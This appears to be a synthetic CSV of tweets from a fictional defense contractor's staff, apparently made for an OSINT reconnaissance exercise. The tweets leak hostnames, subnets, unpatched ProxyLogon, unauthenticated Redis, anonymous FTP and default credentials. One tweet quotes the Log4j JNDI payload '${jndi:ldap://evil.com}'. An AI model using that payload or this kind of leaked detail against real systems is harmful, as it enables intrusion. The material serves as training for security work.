id,created_at,username,display_name,tweet_text,language,retweet_count,like_count,hashtags,mentions,urls,geo_lat,geo_long,place_name
1029,2026-03-04T09:30:00Z,MeridianDefense,Meridian Defense Systems,"Meridian Defense awarded $45M contract for next-gen intelligence analysis platform. Read more: https://meridian-defense.com/news/contract-award #DefenseContract #OSINT",en,78,312,DefenseContract;OSINT,,https://meridian-defense.com/news/contract-award,38.8799,-77.1067,Arlington VA
1030,2026-03-04T14:00:00Z,alex_rivera_eng,Alex Rivera,"Running load tests against our Azure VMs in South Central US. The Windows Server 2022 instances are handling RDP sessions well but I noticed the cert on wkstn-az02 expired. Need to renew. #Azure #CloudOps",en,4,18,Azure;CloudOps,,,,
1031,2026-03-03T10:00:00Z,kpatel_ops,Kumar Patel,"MongoDB performance tuning day. The meridian_contracts collection has grown to 1.8GB. Need to add some indexes and maybe shard. #MongoDB #DatabaseOps",en,5,21,MongoDB;DatabaseOps,,,,
1032,2026-03-03T15:45:00Z,jthompson_sec,James Thompson,"Quarterly pen test report highlights: FTP server still allows anonymous login, 3 services with default credentials, and the WordPress blog needs to be decommissioned. Adding to the backlog. #PenTest",en,16,72,PenTest,,,,
1033,2026-03-02T11:00:00Z,MeridianDefense,Meridian Defense Systems,"Our CTO Patricia Walsh will be keynoting at @BlackHatEvents this summer. Topic: 'Bridging OSINT and Red Team Operations with AI'. #BlackHat #CyberSecurity",en,52,198,BlackHat;CyberSecurity,BlackHatEvents,,38.8799,-77.1067,Arlington VA
1034,2026-03-02T14:30:00Z,lisa_nguyen_net,Lisa Nguyen,"Just discovered that our DNS server (ns1.meridian-defense.com) has recursion enabled for external queries. Opening a ticket to fix ASAP. #DNS #Security",en,9,37,DNS;Security,,,,
1035,2026-03-01T09:15:00Z,dan_williams_it,Dan Williams,"Blocked 1,200 RDP brute force attempts from 185.220.101.x range last night. These persistent threat actors are relentless. #ThreatIntel #BlueTeam",en,27,98,ThreatIntel;BlueTeam,,,,
1036,2026-03-01T12:00:00Z,sarah_blake_hr,Sarah Blake,"Welcoming our new CISO, Dr. Helen Park, to @MeridianDefense next month. She comes from a 15-year career at NSA and Booz Allen. #NewHire #CISO",en,33,145,NewHire;CISO,MeridianDefense,,38.8799,-77.1067,Arlington VA
1037,2026-02-28T10:30:00Z,maria_chen_dev,Maria Chen,"Pushed a hotfix for the SharePoint integration. The Azure VM at sharepoint.meridian-defense.com was returning 500s due to a memory leak. #SharePoint #BugFix",en,4,16,SharePoint;BugFix,,,,
1038,2026-02-28T15:00:00Z,alex_rivera_eng,Alex Rivera,"Our GKE cluster in us-east4 is running beautifully. 4 node pools, 47 pods, zero restarts in 30 days. #GoogleCloud #Kubernetes",en,8,34,GoogleCloud;Kubernetes,,,,
1039,2026-02-27T09:00:00Z,kpatel_ops,Kumar Patel,"Interesting finding: our Redis cache (cache01) has no auth configured. Opened an internal ticket. Should be a quick fix but it's concerning. #Redis #SecurityDebt",en,6,25,Redis;SecurityDebt,,,,
1040,2026-02-27T13:45:00Z,MeridianDefense,Meridian Defense Systems,"Meridian Defense named to Federal Times 'Top 50 Government Contractors' list for 2026. Thank you to our incredible team! #GovCon #Recognition",en,41,176,GovCon;Recognition,,https://meridian-defense.com/news/top50,38.8799,-77.1067,Arlington VA
1041,2026-02-26T08:30:00Z,jthompson_sec,James Thompson,"Setting up Suricata IDS rules for the new Log4j variants. The attackers are getting creative with JNDI payloads. ${jndi:ldap://evil.com} is just the beginning. #IDS #ThreatDetection",en,19,77,IDS;ThreatDetection,,,,
1042,2026-02-26T14:15:00Z,dan_williams_it,Dan Williams,"The Exchange server (mail.meridian-defense.com) is due for patching. ProxyLogon mitigations were applied last year but we need the full update. On the schedule for this weekend. #Exchange #Patching",en,7,31,Exchange;Patching,,,,
1043,2026-02-25T10:00:00Z,lisa_nguyen_net,Lisa Nguyen,"Network diagram updated for Q1. We now have 35+ hosts across on-prem (10.10.1.0/24), AWS (3 regions), Azure (South Central US), and GCP (us-east4). Growing fast! #NetworkOps",en,5,22,NetworkOps,,,,
1044,2026-02-25T16:30:00Z,maria_chen_dev,Maria Chen,"TIL our Tomcat server (app-west.meridian-defense.com) on AWS us-west-2 is still running Java 11. Need to plan the migration to Java 17. #Java #TechDebt",en,3,15,Java;TechDebt,,,,
1045,2026-02-24T09:30:00Z,MeridianDefense,Meridian Defense Systems,"We're expanding our SOC team! Hiring Tier 2 and Tier 3 analysts. Tools include Elastic SIEM, Suricata, Grafana, and custom threat intel platforms. Apply now! #SOCJobs #Hiring",en,24,88,SOCJobs;Hiring,,https://meridian-defense.com/careers/soc-analyst,38.8799,-77.1067,Arlington VA
1046,2026-02-24T14:00:00Z,kpatel_ops,Kumar Patel,"Automated our SSL certificate renewal process using certbot. No more expired certs... hopefully. Looking at you docs-east and k8s-staging. #SSL #Automation",en,7,29,SSL;Automation,,,,
1047,2026-02-23T11:15:00Z,alex_rivera_eng,Alex Rivera,"Photo from the Dublin office setup! portal-eu.meridian-defense.com is live and serving our EU customers. Compliance with GDPR data residency requirements. #Dublin #GDPR",en,13,56,Dublin;GDPR,,,53.3331,-6.2489,Dublin Ireland
1048,2026-02-23T15:45:00Z,jthompson_sec,James Thompson,"Vulnerability scan complete. Top finding: CVE-2021-26855 (ProxyLogon) on our Exchange server. CVSS 9.8. This needs to be priority #1 for remediation. #VulnMgmt #Critical",en,28,104,VulnMgmt;Critical,,,,
1049,2026-02-22T10:00:00Z,rob_hartwell_ceo,Robert Hartwell,"Board meeting went well. Approved budget for new SOC tools and additional headcount. Meridian Defense is investing heavily in our security posture. #BoardMeeting #Investment",en,16,72,BoardMeeting;Investment,,,,
1050,2026-02-22T14:30:00Z,sarah_blake_hr,Sarah Blake,"Fun fact: Meridian Defense Systems has employees in 4 states and 2 countries. Arlington HQ, Portland satellite, San Antonio cloud ops, and our new Dublin EU office. #CompanyFacts",en,9,41,CompanyFacts,,,,
